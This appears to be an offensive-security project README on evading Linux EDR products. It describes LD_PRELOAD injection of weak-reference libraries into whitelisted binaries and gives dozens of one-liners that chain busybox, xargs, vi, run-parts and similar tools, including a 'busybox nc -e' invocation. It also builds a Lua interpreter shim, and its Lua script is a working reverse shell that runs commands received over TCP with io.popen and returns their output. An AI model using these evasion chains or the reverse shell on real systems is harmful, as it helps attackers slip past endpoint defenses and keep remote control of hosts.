Behavioral Manipulation of Whitelisted Executables in Linux for EDR Evasion

Scenario:

Endpoint Detection and Response solutions have landed in Linux. With the increasing footprint of Linux machines present in in data centers threat actors have retooled to face the defensive capabilities. EDRs have their challenges in covering Linux landscape, and as such they come in various designs and address defense differently. Some focus on sandboxing, others place more effort on execution heuristics, yet others provide facilities to create restricted shells and exist in support of an enterprise policy, aiding with whielisting approved executables on systems. 

On a recent engagement  our team  was faced with overcoming a commercial EDR on Linux. We wanted to share a few techniques  

The idea is to: 
- ride approved binaries without modifying them or injecting them at runtime
- start them preloaded but without any details of the internal workings 
- use library preloading in novel ways
- split and scatter offensive functionality to fool heuristics, forensics and gain func via chaining
- widening the shim with non-native functionality for rapid prototyping. 


- Hooking an unknown (or non-specific) API assumes 
 - you know how the target API workings
 - you have ability to target it without detection (exec or external watcher)
 - you have the ability to interoperate claencly, fully, implment filter and to extend hooks
 - you also may need to have inspection tooling to hook *that specific use case*, in adveresarial env while the mom is watching


What is you can be agnostic to the application you are tryint to control
- Inject at the start
- Inject generically 
- Expand features out of band
	- dynamic loading
	- weak ref loading

- DFIR lifting target executable gets non-modified, clean exe


## Usage

`LD_PRELOAD=lib/weakrefso.so:lib/weakrefso2.so bin/main_weakref`

`LD_LIBRARY_PATH=$LD_LIBRARY_PATH:../lib LD_PRELOAD=libweakref.so:libweakref2.so ../bin/main_weakref`

cxa: `LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /usr/bin/java`

`/bin/busybox /bin/ls`
` LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  ls `
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  find /bin -name cat -exec /bin/ls / \; `
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  nc -f /dev/pts/0  -e /bin/ls`
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  openvt -c 5  -w /bin/ls > /tmp/ls.out`

1. 
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts  --regex '^main_.*$' ./bin/`

-- No /bin/ls ---
2. `mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls; LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts   /tmp/shadowrun/`

`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so script -c /bin/ls`
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so busybox setsid  -c /bin/ls`
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so start-stop-daemon -x /bin/ls --start`
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so taskset 0x00000001 /bin/ls`
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so echo | xargs /bin/ls`

`echo | LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/ls`

I mean ....
`echo | LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/busybox xargs xargs /bin/busybox /bin/ls`
`echo | LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls`
`echo | LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox time /bin/ls`

I meean ...... 
`LD_PRELOAD=./lib/weakrefso.so:./lib/weakrefso2.so /lib64/ld-linux-x86-64.so.2  vi -ensX $(/bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'`

Breaks TTY
`vi -ensX $(/lib64/ld-linux-x86-64.so.2 /bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'`




-----

Building a lua-5.3.5 Lua shared library:
- Download Lua sources: `curl -R -O http://www.lua.org/ftp/lua-5.3.5.tar.gz ; tar zxf lua-5.3.5.tar.gz`

- Make Lua with `-fPIC`, this generates object files
`make MYCFLAGS="$CFLAGS -fPIC -DLUA_COMPAT_5_2 -DLUA_COMPAT_5_1" MYLDFLAGS="$LDFLAGS" linux`

- Compile Lua objects into a shared library (skil luac.o due to redefinition of `main`):
`gcc -o liblua.so -shared $(ls -1 *.o  | egrep -v '(luac.o)' | tr '\n' ' ') -fPIC`

```
liblua.so: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=5e6c638e9225395f4d1b47531081c4ffd20d8d57, not stripped```

``
ldd liblua.so 
	linux-vdso.so.1 (0x00007ffe619ba000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ba1021000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f6ba1241000)
```

invoke_lua.c
```c
#include <lua.h>                                /* Always include this when calling Lua */
#include <lauxlib.h>                            /* Always include this when calling Lua */
#include <lualib.h>                             /* Always include this when calling Lua */

#include <stdlib.h>                             /* For function exit() */
#include <stdio.h>                              /* For input/output */

void bail(lua_State *L, char *msg){
	fprintf(stderr, "\nFATAL ERROR:\n  %s: %s\n\n",
		msg, lua_tostring(L, -1));
	exit(1);
}

int main(int argc, char** argv)
{

	if (argc !=2){
		printf("Usage %s </path/to/script.lua>\n", argv[0]);
		return 1;
	}

    lua_State *L;

    L = luaL_newstate();                  /* Create Lua state variable */
    luaL_openlibs(L);                     /* Load Lua libraries */

    if (luaL_loadfile(L, argv[1]))        /* Load but don't run the Lua script */
	bail(L, "luaL_loadfile() failed");    /* Error out if file can't be read */

    printf("In C, calling Lua\n");

    if (lua_pcall(L, 0, 0, 0))            /* Run the loaded Lua script */
	bail(L, "lua_pcall() failed");        /* Error out if Lua file has an error */

    printf("Back in C again\n");

    lua_close(L);                         /* Clean up, free the Lua state var */

    return 0;
}

```

- Use the newly minted `liblua.so` to build a `C` shim:
`gcc -o invoke_lua invoke_lua.c -I/root/Code/zombieant/ext/luadist-static-lua/include/ -L`pwd` -llua -lm -ldl -lreadline`

```
ldd invoke_lua
	linux-vdso.so.1 (0x00007ffd0036a000)
	liblua.so => not found
	libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc0c0cb1000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc0c0cac000)
	libreadline.so.7 => /lib/x86_64-linux-gnu/libreadline.so.7 (0x00007fc0c0a5f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc0c08a2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc0c0e71000)
	libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fc0c0874000)

```

- Invoke lua script via `C` shim preloading `liblua.so` as dependency:
`LD_LIBRARY_PATH=. LD_PRELOAD=./liblua.so ./invoke_lua hello.lua`


### Lua libraries
- Manual:
wget https://luarocks.org/manifests/gunnar_z/lsocket-1.4.1-1.rockspec
wget $(grep url lsocket-1.4.1-1.rockspec  | cut -d= -f2 | sed 's/"//g')

- with luarocks:

`luarocks instal luasocket`

Find luarocks install location and copy to your deployment dir where lbraries will live:
`rsync -rvz /usr/local/lib/lua/5.3/* slibs/`



```lua
print(package.path..'\n'..package.cpath)

-- via cpath
package.cpath = './slibs/?.so;'
print("Cpath:"..package.cpath)
local socket = require('socket')
local tcp = assert(socket.tcp());

local server = assert(socket.bind("127.0.0.1", 8081))
-- find out which port the OS chose for us
local ip, port = server:getsockname()
print("Server on " .. ip .. ":"..port)

-- via path
local rhost = "127.0.0.1"
local rport = "1337"
assert(tcp:connect(rhost,rport));
  while true do
    local r,x=tcp:receive()
    local fin=assert(io.popen(r,"r"))
    local data=assert(fin:read("*a"));
    tcp:send(data);
  end;
fin:close()
tcp:close()
-- local path = "./slib/lsocket.so"
--local f = assert(loadlib(path, "luaopen_socket"))
-- f()

```


### In memroy SQLite3
swqlite:
gcc -shared -o libsqlite3.so -fPIC sqlite3.o -ldl -lpthr

driver:
```c
#include <stdio.h>      // printf
#include <sqlite3.h>    // SQLite header (from /usr/include)

int main()
{
    sqlite3 *db;        // database connection
    int rc;             // return code
    char *errmsg;       // pointer to an error string

    /*
     * open SQLite database file test.db
     * use ":memory:" to use an in-memory database
     */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        printf("ERROR opening SQLite DB in memory: %s\n", sqlite3_errmsg(db));
        goto out;
    }
    printf("opened SQLite handle successfully.\n");

    /* use the database... */

out:
    /*
     * close SQLite database
     */
    sqlite3_close(db);
    printf("database closed.\n");
}
```
`gcc -O0  driver.c -o driver -L`pwd` -lsqlite3  -I`pwd` -ldl -lpthread`

```LD_LIBRARY_PATH=. LD_PRELOAD=./libsqlite3.so ./driver 
opened SQLite handle successfully.
database closed.```



## TODO
- fully clean LD_PRELOAD  in ctor of an injector )libctx)
- weak attributes modules load from libctx
- multilib loading in LD_PRELOAD
- __gmon_start__ (w) https://github.com/lattera/glibc/blob/master/csu/gmon-start.c
	[ref] (https://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol)
- JNI LD_PRELOAD
- execve LD_PRELOAD putenv?
- malisal ELF loader work
- https://github.com/daveho/EasySandbox